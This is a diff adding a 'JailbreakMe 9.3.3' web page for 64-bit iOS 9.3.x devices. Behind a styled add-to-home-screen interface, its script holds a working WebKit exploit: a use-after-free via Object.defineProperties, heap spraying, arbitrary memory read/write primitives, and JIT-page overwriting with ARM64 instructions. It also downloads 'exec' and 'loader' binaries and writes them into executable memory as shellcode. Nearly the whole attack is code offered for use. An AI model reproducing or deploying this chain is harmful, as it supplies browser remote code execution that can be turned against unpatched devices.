@@ -1,0 +1,491 @@
+<html manifest="off.appcache">
+<head>
+  <title>JailbreakMe 9.3.3</title>
+  <meta name="viewport" content="user-scalable=1.0,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no">
+  <meta name="apple-mobile-web-app-title" content="JailbreakMe" />
+  
+  <!-- Home screen icons -->
+  <link rel="apple-touch-icon" href="icon.png">
+  <link rel="apple-touch-icon" sizes="152x152" href="icon.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="icon.png">
+  
+  <!-- Favicon -->
+  <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
+  <link rel="icon" href="favicon.ico" type="image/x-icon">
+  
+  <link rel="apple-touch-startup-image" href="splash.png">
+  <link rel="manifest" href="manifest.json">
+  <script>
+    if (window.applicationCache) {
+      window.applicationCache.addEventListener('cached', function() {
+        console.log('Application cached successfully');
+      });
+      
+      window.applicationCache.addEventListener('error', function() {
+        console.log('Error caching application');
+      });
+    }
+  </script>
+  
+  <style>
+    html {
+      background: #1a1a1a;
+      height: 100%;
+    }
+    
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+      background: linear-gradient(135deg, #1a1a1a, #2c2c2c);
+      color: #fff;
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+    
+    .allow-scroll {
+      overflow-y: auto;
+      position: relative;
+    }
+    
+    .block-scroll {
+      overflow: hidden;
+      position: fixed;
+      width: 100%;
+      top: 0;
+      left: 0;
+    }
+    
+    .container {
+      text-align: center;
+      padding: 20px;
+      max-width: 90%;
+    }
+
+    .containerTutorial {
+      text-align: center;
+      padding: 20px;
+      max-width: 90%;
+      margin-top: 30px;
+    }
+    
+    .logo {
+      width: 128px;
+      height: 128px;
+      margin-bottom: 15px;
+      border-radius: 22px;
+      overflow: hidden;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+    }
+
+    .logoTutorial {
+      width: 80px;
+      height: 80px;
+      margin-bottom: 15px;
+      border-radius: 18px;
+      overflow: hidden;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+    }
+    
+    h1 {
+      font-size: 32px;
+      margin-bottom: 10px;
+    }
+    
+    .subtitle {
+      font-size: 14px;
+      opacity: 0.7;
+      margin-bottom: 30px;
+    }
+    
+    .jailbreak-btn {
+      display: inline-block;
+      background: linear-gradient(90deg, #007aff, #5856d6);
+      color: white;
+      border: none;
+      border-radius: 25px;
+      padding: 12px 40px;
+      font-size: 18px;
+      font-weight: bold;
+      text-decoration: none;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+      transition: transform 0.2s, box-shadow 0.2s;
+    }
+    
+    .jailbreak-btn:active {
+      transform: scale(0.95);
+      box-shadow: 0 2px 5px rgba(0,0,0,0.3);
+    }
+    
+    .error-message {
+      background-color: rgba(255, 59, 48, 0.2);
+      border-left: 4px solid #ff3b30;
+      padding: 15px;
+      border-radius: 5px;
+      margin: 20px auto;
+      color: #fff;
+      text-align: left;
+      max-width: 80%;
+    }
+    
+    .instructions {
+      font-size: 18px;
+      color: #fff;
+      background-color: rgba(0, 122, 255, 0.1);
+      border-left: 4px solid #007aff;
+      padding: 15px;
+      border-radius: 5px;
+      margin: 20px auto;
+      text-align: left;
+      max-width: 95%;
+    }
+    
+    .guide-image {
+      width: 100%;
+      max-width: 390px;
+      height: auto;
+      margin: 20px auto;
+      border-radius: 12px;
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+    }
+    
+    .arrow {
+      color: #007aff;
+      font-size: 24px;
+      margin: 10px 0;
+      animation: bounce 1.5s infinite;
+    }
+    
+    @keyframes bounce {
+      0%, 20%, 50%, 80%, 100% {
+        transform: translateY(0);
+      }
+      40% {
+        transform: translateY(-10px);
+      }
+      60% {
+        transform: translateY(-5px);
+      }
+    }
+  </style>
+</head>
+<body>
+  <div id="content-container"></div>
+
+<script>
+const browserModeHTML = `
+  <div id="browser-container" class="container">
+    <br>
+    <br>
+    <img src="icon.png" alt="JailbreakMe" class="logoTutorial">
+    <h1>JailbreakMe 9.3.3</h1>
+    <p class="subtitle">Jailbreak for iOS 9.3.x devices (64-bit only)</p>
+    
+    <div class="instructions">
+      <strong>⚠️ Important:</strong> You must add this app to your home screen to use the jailbreak.
+    </div>
+    
+    <div class="arrow">↓</div>
+    
+    <img src="install-guide.png" alt="Installation Guide" class="guide-image">
+    
+   <p class="subtitle">After adding to your home screen, open the app from there to start the jailbreak process.</p>
+  </div>
+`;
+
+const webAppModeHTML = `
+  <div id="webapp-container" class="container">
+    <img src="icon.png" alt="JailbreakMe" class="logo">
+    <h1>JailbreakMe 9.3.3</h1>
+    <p class="subtitle">For iOS 9.3.x devices (64-bit only)</p>
+    <a href="javascript:go()" class="jailbreak-btn">JAILBREAK</a>
+  </div>
+`;
+
+function isWebApp() {
+  return window.navigator.standalone || 
+         (("standalone" in window.navigator) && window.navigator.standalone);
+}
+
+function setScrollBehavior(isWebAppMode) {
+  const body = document.body;
+  const html = document.documentElement;
+  
+  if (isWebAppMode) {
+    body.classList.add('block-scroll');
+    body.classList.remove('allow-scroll');
+    html.style.overflow = 'hidden';
+  }
+}
+
+document.addEventListener('DOMContentLoaded', function() {
+  const contentContainer = document.getElementById('content-container');
+  const isWebAppMode = isWebApp();
+  
+  setScrollBehavior(isWebAppMode);
+  
+  if (isWebAppMode) {
+    contentContainer.innerHTML = webAppModeHTML;
+  } else {
+    contentContainer.innerHTML = browserModeHTML;
+  }
+});
+
+function load_binary_resource(url) {
+     var req = new XMLHttpRequest();
+     req.open('GET', url, false);
+     req.overrideMimeType('text\/plain; charset=x-user-defined');
+     req.send(null);
+     if (req.status != 200) {
+         document.querySelector('#webapp-container').innerHTML = "<div class='error-message'>⚠️ Error downloading the loader. Make sure you have an internet connection</div>";
+         stop = 1
+     };
+     return req.responseText;
+}
+var mem0 = 0;
+var mem1 = 0;
+var mem2 = 0;
+
+function read4(addr) {
+  mem0[4] = addr;
+  var ret = mem2[0];
+  mem0[4] = mem1;
+  return ret;
+}
+
+function write4(addr, val) {
+  mem0[4] = addr;
+  mem2[0] = val;
+  mem0[4] = mem1;
+}
+filestream = load_binary_resource("exec")
+var shll = new Uint32Array(filestream.length / 4);
+for (var i = 0; i < filestream.length;) {
+  var word = (filestream.charCodeAt(i) & 0xff) | ((filestream.charCodeAt(i + 1) & 0xff) << 8) | ((filestream.charCodeAt(i + 2) & 0xff) << 16) | ((filestream.charCodeAt(i + 3) & 0xff) << 24);
+  shll[i / 4] = word;
+  i += 4;
+}
+var print = alert;
+_dview = null;
+
+function u2d(low, hi) {
+  if (!_dview) _dview = new DataView(new ArrayBuffer(16));
+  _dview.setUint32(0, hi);
+  _dview.setUint32(4, low);
+  return _dview.getFloat64(0);
+}
+var pressure = new Array(100);
+var bufs = new Array(10000);
+dgc = function() {
+  for (var i = 0; i < pressure.length; i++) {
+    pressure[i] = new Uint32Array(0x10000);
+  }
+  for (var i = 0; i < pressure.length; i++) {
+    pressure[i] = 0;
+  }
+}
+
+function swag() {
+  if (bufs[0]) return;
+  dgc();
+  dgc();
+  dgc();
+  dgc();
+  dgc();
+  dgc();
+  dgc();
+  dgc();
+  for (i = 0; i < bufs.length; i++) {
+    bufs[i] = new Uint32Array(0x100 * 2)
+    for (k = 0; k < bufs[i].length;) {
+      bufs[i][k++] = 0x41414141;
+      bufs[i][k++] = 0xffff0000;
+    }
+  }
+}
+var trycatch = "";
+for (var z = 0; z < 0x2000; z++) trycatch += "try{} catch(e){}; ";
+var fc = new Function(trycatch);
+var fcp = 0;
+var smsh = new Uint32Array(0x10)
+
+function smashed(stl) {
+  var container = document.querySelector('#webapp-container');
+  container.innerHTML = "<img src='icon.png' alt='JailbreakMe' class='logo'><h1>Success!</h1><p class='subtitle'>Your device will be jailbroken.</p>";
+  var jitf = (smsh[(0x10 + smsh[(0x10 + smsh[(fcp + 0x18) / 4]) / 4]) / 4]);
+  write4(jitf, 0xd28024d0);
+  write4(jitf + 4, 0x58000060);
+  write4(jitf + 8, 0xd4001001);
+  write4(jitf + 12, 0xd65f03c0);
+  write4(jitf + 16, jitf + 0x20);
+  write4(jitf + 20, 1);
+  fc();
+  var dyncache = read4(jitf + 0x20);
+  var dyncachev = read4(jitf + 0x20);
+  var go = 1;
+  while (go) {
+    if (read4(dyncache) == 0xfeedfacf) {
+      for (i = 0; i < 0x1000 / 4; i++) {
+        if (read4(dyncache + i * 4) == 0xd && read4(dyncache + i * 4 + 1 * 4) == 0x40 && read4(dyncache + i * 4 + 2 * 4) == 0x18 && read4(dyncache + i * 4 + 11 * 4) == 0x61707369) // lulziest mach-o parser ever
+        {
+          go = 0;
+          break;
+        }
+      }
+    }
+    dyncache += 0x1000;
+  }
+  dyncache -= 0x1000;
+  var bss = [];
+  var bss_size = [];
+  for (i = 0; i < 0x1000 / 4; i++) {
+    if (read4(dyncache + i * 4) == 0x73625f5f && read4(dyncache + i * 4 + 4) == 0x73) {
+      bss.push(read4(dyncache + i * 4 + (0x20)) + dyncachev - 0x80000000);
+      bss_size.push(read4(dyncache + i * 4 + (0x28)));
+    }
+  }
+  var shc = jitf;
+  var filestream = load_binary_resource("loader")
+  for (var i = 0; i < filestream.length;) {
+    var word = (filestream.charCodeAt(i) & 0xff) | ((filestream.charCodeAt(i + 1) & 0xff) << 8) | ((filestream.charCodeAt(i + 2) & 0xff) << 16) | ((filestream.charCodeAt(i + 3) & 0xff) << 24);
+    write4(shc, word);
+    shc += 4;
+    i += 4;
+  }
+  jitf &= ~0x3FFF;
+  jitf += 0x8000;
+  write4(shc, jitf);
+  write4(shc + 4, 1);
+  // copy macho
+  for (var i = 0; i < shll.length; i++) {
+    write4(jitf + i * 4, shll[i]);
+  }
+  alert("All set. Close this pop-up and lock your screen to continue. See you on the other side!")
+  for (var i = 0; i < bss.length; i++) {
+    for (k = bss_size[i] / 6; k < bss_size[i] / 4; k++) {
+      write4(bss[i] + k * 4, 0);
+    }
+  }
+  fc();
+  alert(2);
+}
+
+function go() {
+  var img = new Image();
+  img.src = 'icon.png';
+  
+  var container = document.querySelector('#webapp-container');
+  var button = container.querySelector('.jailbreak-btn');
+  var title = container.querySelector('h1');
+  var subtitle = container.querySelector('.subtitle');
+  
+  title.textContent = "Jailbreaking...";
+  subtitle.textContent = "Please wait. This may take a moment.";
+  button.style.display = "none";
+  
+  dgc();
+  setTimeout(go_, 400);
+}
+
+function go_() {
+  if (smsh.length != 0x10) {
+    smashed();
+    return;
+  }
+  dgc();
+  var arr = new Array(0x100);
+  var yolo = new ArrayBuffer(0x1000);
+  arr[0] = yolo;
+  arr[1] = 0x13371337;
+  var not_number = {};
+  not_number.toString = function() {
+    arr = null;
+    props["stale"]["value"] = null;
+    swag();
+    return 10;
+  };
+  var props = {
+    p0: {
+      value: 0
+    },
+    p1: {
+      value: 1
+    },
+    p2: {
+      value: 2
+    },
+    p3: {
+      value: 3
+    },
+    p4: {
+      value: 4
+    },
+    p5: {
+      value: 5
+    },
+    p6: {
+      value: 6
+    },
+    p7: {
+      value: 7
+    },
+    p8: {
+      value: 8
+    },
+    length: {
+      value: not_number
+    },
+    stale: {
+      value: arr
+    },
+    after: {
+      value: 666
+    }
+  };
+  var target = [];
+  var stale = 0;
+  var before_len = arr.length;
+  Object.defineProperties(target, props);
+  stale = target.stale;
+  stale[0] += 0x101;
+  stale[1] = {}
+  for (var z = 0; z < 0x1000; z++) fc();
+  for (i = 0; i < bufs.length; i++) {
+    for (k = 0; k < bufs[0].length; k++) {
+      if (bufs[i][k] == 0x41414242) {
+        stale[0] = fc;
+        fcp = bufs[i][k];
+        stale[0] = {
+          'a': u2d(105, 0x1172600),
+          'b': u2d(0, 0),
+          'c': smsh,
+          'd': u2d(0x100, 0)
+        }
+        stale[1] = stale[0]
+        bufs[i][k] += 0x10; // misalign so we end up in JSObject's properties, which have a crafted Uint32Array pointing to smsh
+        bck = stale[0][4];
+        stale[0][4] = 0; // address, low 32 bits
+        // stale[0][5] = 1; // address, high 32 bits == 0x100000000
+        stale[0][6] = 0xffffffff;
+        mem0 = stale[0];
+        mem1 = bck;
+        mem2 = smsh;
+        bufs.push(stale)
+        if (smsh.length != 0x10) {
+          smashed(stale[0]);
+        }
+        return;
+      }
+    }
+  }
+  document.location.reload();
+}
+</script>
+</body>
+</html>
